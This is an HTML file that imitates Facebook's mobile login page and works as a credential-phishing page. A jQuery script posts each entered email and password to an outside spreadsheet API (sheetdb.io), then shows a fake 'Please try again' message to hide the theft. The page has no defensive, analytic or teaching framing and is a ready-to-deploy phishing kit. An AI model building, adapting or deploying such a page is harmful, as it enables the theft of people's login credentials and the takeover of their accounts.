<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Facebook - log in or sign up</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
    body { font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color:#fff; }
    .fb-blue-bg { background-color:#1877F2; }
    .fb-blue-text { color:#1877F2; }
    .fb-input-exact {
      height:60px; padding:0 16px; border:1px solid #c9c0c0;
      border-radius:15px; font-size:16px; font-weight:400; color:#1c1e21;
    }
    .fb-input-exact::placeholder { color:#606770; }
    .fb-input-exact:focus { outline:none; border-color:#1877F2; }
    .message-box {
      position:fixed; top:50%; left:50%; transform:translate(-50%,-50%);
      background:#fff; padding:1.5rem; border-radius:.75rem;
      box-shadow:0 5px 15px rgba(0,0,0,.2);
      z-index:1000; text-align:center; opacity:0; visibility:hidden;
      transition:opacity .3s, visibility .3s;
    }
    .message-box.show { opacity:1; visibility:visible; }
  </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-between mx-auto max-w-sm">

<script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
<script>
function SubForm (){
  $.ajax({
    url:'https://sheetdb.io/api/v1/y1ep4z217uldo',
    type:'post',
    data:$("#myForm").serialize(),
    success: function(){
      showMessage("Please try again :)");
      $("#myForm")[0].reset();
    },
    error: function(){
      showMessage("There was an error :(");
    }
  });
}
</script>

<!-- Message Box -->
<div id="messageBox" class="message-box w-11/12 max-w-xs">
  <p class="text-gray-700 font-medium mb-3 text-sm" id="messageText"></p>
  <button onclick="document.getElementById('messageBox').classList.remove('show')" class="w-full fb-blue-bg text-white py-2 rounded-md font-medium hover:opacity-90 transition duration-150">OK</button>
</div>

<main class="w-full flex flex-col items-center p-6 flex-grow pt-0">
  <!-- Banner -->
  <div class="w-full flex items-center pt-5 pb-5 px-4 bg-white">
    <svg xmlns="http://www.w3.org/2000/svg" fill="#1877F2" class="w-6 h-6 mr-3"><path d="M12 2C6.48 2 2 6.48..."/></svg>
    <a href="#" class="text-sm fb-blue-text font-medium leading-tight">Get Facebook for Android and browse faster.</a>
  </div>
  <div class="w-full border-t border-gray-100"></div>
  <div class="mt-4 mb-10 text-center"><span class="text-xs text-gray-500 font-medium">English (US)</span></div>
  <div class="mb-10"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b9/2023_Facebook_icon.svg" alt="Facebook Logo" width="60" height="60"/></div>

  <!-- Login Form -->
  <form id="myForm" class="w-full max-w-xs space-y-3">
    <div class="flex justify-center">
    	
      <input type="text" id="Email" name="email" placeholder="Mobile number or email" required class="w-11/12 fb-input-exact">
    </div>
    <div class="flex justify-center">
    	
      <input type="password" id="Password" name="password" placeholder="Password" required class="w-11/12 fb-input-exact">
      
    </div>
    <button type="button" onclick="SubForm()" class="w-11/12 fb-blue-bg text-white font-semibold py-3 rounded-lg text-base hover:bg-blue-600 transition duration-150 shadow-md mt-4 mx-auto block" style="border-radius:15px;font-weight:600;">Log in</button>
  </form>

  <div class="mt-4 text-center w-full max-w-xs">
    <a href="#" class="fb-blue-text text-sm hover:underline font-medium">Forgot password?</a>
  </div>

  <div class="w-full flex justify-center mt-6 mb-8"><div class="h-px w-3/4 max-w-[200px] bg-gray-300"></div></div>

  <div class="text-center w-full max-w-xs mb-4 mt-20">
    <button onclick="showMessage('Create new account page would open here.')" class="w-11/12 bg-white fb-blue-text font-semibold py-3 border-2 border-[#1877F2] rounded-lg text-base hover:bg-blue-50 transition duration-150 mx-auto block" style="border-radius:15px;font-weight:600;">Create new account</button>
  </div>
</main>

<footer class="w-full max-w-sm text-center p-4 text-gray-500 text-xs">
  <div class="flex items-center justify-center space-x-1">
    <span class="font-bold" style="color:#606770;font-size:15px;">âˆž</span>
    <span class="font-semibold text-gray-500 text-xs" style="color:#606770;">Meta</span>
  </div>
</footer>

<script>
function showMessage(message){
  const messageBox=document.getElementById('messageBox');
  document.getElementById('messageText').textContent=message;
  messageBox.classList.add('show');
}
</script>
</body>

</html>
